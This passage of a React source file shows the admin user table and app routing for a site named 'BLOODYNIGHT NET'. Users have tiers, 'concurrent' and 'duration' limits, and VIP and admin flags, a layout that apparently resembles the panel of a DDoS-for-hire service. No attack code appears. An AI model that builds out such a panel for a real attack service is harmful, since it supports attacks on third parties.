                        React.createElement('table', { className: 'min-w-full divide-y divide-gray-700' },
                            React.createElement('thead', null,
                                React.createElement('tr', null,
                                    React.createElement('th', { className: 'px-6 py-3 text-left text-xs font-medium text-gray-200 uppercase tracking-wider' }, 'USERNAME'),
                                    React.createElement('th', { className: 'px-6 py-3 text-left text-xs font-medium text-gray-200 uppercase tracking-wider' }, 'TIER'),
                                    React.createElement('th', { className: 'px-6 py-3 text-left text-xs font-medium text-gray-200 uppercase tracking-wider' }, 'CONCURRENT'),
                                    React.createElement('th', { className: 'px-6 py-3 text-left text-xs font-medium text-gray-200 uppercase tracking-wider' }, 'DURATION'),
                                    React.createElement('th', { className: 'px-6 py-3 text-left text-xs font-medium text-gray-200 uppercase tracking-wider' }, 'VIP'),
                                    React.createElement('th', { className: 'px-6 py-3 text-left text-xs font-medium text-gray-200 uppercase tracking-wider' }, 'ADMIN'),
                                    React.createElement('th', { className: 'px-6 py-3 text-left text-xs font-medium text-gray-200 uppercase tracking-wider' }, 'ACTIONS')
                                )
                            ),
                            React.createElement('tbody', { className: 'bg-gray-800 divide-y divide-gray-700' },
                                users.map(userItem => (
                                    editingUser && editingUser.username === userItem.username ? (
                                        // Edit row
                                        React.createElement('tr', { key: userItem.username },
                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' }, editingUser.username),
                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' },
                                                React.createElement('select', {
                                                    className: 'input-field w-20',
                                                    value: editingUser.tier,
                                                    onChange: (e) => setEditingUser({ ...editingUser, tier: e.target.value })
                                                },
                                                    React.createElement('option', { value: 'Noob' }, 'Noob'),
                                                    React.createElement('option', { value: 'Normal' }, 'Normal'),
                                                    React.createElement('option', { value: 'VIP' }, 'VIP')
                                                )
                                            ),
                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' },
                                                React.createElement('input', {
                                                    type: 'number',
                                                    className: 'input-field w-20',
                                                    value: editingUser.concurrent,
                                                    onChange: (e) => setEditingUser({ ...editingUser, concurrent: parseInt(e.target.value) || 0 })
                                                })
                                            ),
                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' },
                                                React.createElement('input', {
                                                    type: 'number',
                                                    className: 'input-field w-20',
                                                    value: editingUser.duration,
                                                    onChange: (e) => setEditingUser({ ...editingUser, duration: parseInt(e.target.value) || 0 })
                                                })
                                            ),
                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' },
                                                React.createElement('input', {
                                                    type: 'checkbox',
                                                    className: 'form-checkbox',
                                                    checked: editingUser.isLifetimeVIP,
                                                    onChange: (e) => setEditingUser({ ...editingUser, isLifetimeVIP: e.target.checked })
                                                })
                                            ),
                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' },
                                                React.createElement('input', {
                                                    type: 'checkbox',
                                                    className: 'form-checkbox',
                                                    checked: editingUser.isAdmin,
                                                    onChange: (e) => setEditingUser({ ...editingUser, isAdmin: e.target.checked })
                                                })
                                            ),
                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap text-right text-sm font-medium space-x-2' },
                                                React.createElement('button', {
                                                    onClick: () => handleUpdateUser(editingUser),
                                                    className: 'btn-primary px-3 py-1 text-xs'
                                                }, 'SAVE'),
                                                React.createElement('button', {
                                                    onClick: () => setEditingUser(null),
                                                    className: 'btn-logout px-3 py-1 text-xs'
                                                }, 'CANCEL')
                                            )
                                        )
                                    ) : (
                                        // Display row
                                        React.createElement('tr', { key: userItem.username },
                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' }, userItem.username),
                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' }, userItem.tier),
                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' }, userItem.concurrent),
                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' }, userItem.duration),
                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' }, userItem.isLifetimeVIP ? 'Yes' : 'No'),
                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' }, userItem.isAdmin ? 'Yes' : 'No'),
                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap text-right text-sm font-medium space-x-2' },
                                                React.createElement('button', {
                                                    onClick: () => setEditingUser({ ...userItem }), // Create a copy for editing
                                                    className: 'btn-primary px-3 py-1 text-xs'
                                                }, 'EDIT'),
                                                React.createElement('button', {
                                                    onClick: () => handleDeleteUser(userItem.username),
                                                    className: 'btn-logout px-3 py-1 text-xs'
                                                }, 'DELETE')
                                            )
                                        )
                                    )
                                ))
                            )
                        )
                    )
                )
            )
        )
    );
};
// --- END: src/AdminPanel.js ---


// --- BEGIN: src/App.js (Main Application Component) ---
const App = () => {
    const { user, loading, logout } = useAuth();
    const [currentPage, setCurrentPage] = React.useState('dashboard'); // 'dashboard' or 'admin'

    // Redirect to dashboard/admin based on user role after login
    React.useEffect(() => {
        if (!loading && user) {
            if (user.isAdmin) {
                setCurrentPage('admin');
            } else {
                setCurrentPage('dashboard');
            }
        } else if (!loading && !user) {
            // If not logged in, ensure we are not on dashboard/admin page
            setCurrentPage('auth');
        }
    }, [user, loading]);

    const handleAuthSuccess = () => {
        // After successful login/signup, AuthContext's useEffect will update `user`
        // which will then trigger the useEffect above to set the correct page.
        // No explicit page setting needed here.
    };

    const renderPage = () => {
        if (loading) {
            return React.createElement('div', { className: 'min-h-screen flex items-center justify-center text-gray-300 text-xl' }, 'LOADING...');
        }

        if (!user) {
            return React.createElement(Auth, { onAuthSuccess: handleAuthSuccess });
        }

        // Render Header Bar
        const headerBar = React.createElement('header', { className: 'header-bar' },
            React.createElement('div', { className: 'site-title' }, 'BLOODYNIGHT NET'),
            React.createElement('nav', null,
                React.createElement('button', {
                    onClick: () => setCurrentPage('dashboard'),
                    className: `nav-link ${currentPage === 'dashboard' ? 'active' : ''}`
                }, 'DASHBOARD'),
                user.isAdmin && React.createElement('button', {
                    onClick: () => setCurrentPage('admin'),
                    className: `nav-link ${currentPage === 'admin' ? 'active' : ''}`
                }, 'ADMIN PANEL'),
                React.createElement('button', { onClick: logout, className: 'btn-logout' }, 'LOGOUT')
            )
        );

        // Render main content based on currentPage
        let mainContent;
        switch (currentPage) {
            case 'dashboard':
                mainContent = React.createElement(Dashboard, null);
                break;
            case 'admin':
                mainContent = React.createElement(AdminPanel, null);
                break;
            default:
                mainContent = React.createElement('div', { className: 'min-h-screen flex items-center justify-center text-gray-300 text-xl' }, 'PAGE NOT FOUND');
        }

        return React.createElement(React.Fragment, null, headerBar, mainContent);
    };

    return (
        React.createElement(AuthProvider, null,
            React.createElement(BackgroundDots, null),
            renderPage()
        )
    );
};
// --- END: src/App.js ---

// Mount the main App component to the DOM
const rootElement = document.getElementById('root');

if (rootElement) {
    const root = ReactDOM.createRoot(rootElement);
    root.render(
        React.createElement(React.StrictMode, null,
            React.createElement(App, null)
        )
    );
    console.log("React application mounted successfully to #root.");
} else {
    console.error("Error: Root element with ID 'root' not found. React application cannot be mounted.");
}
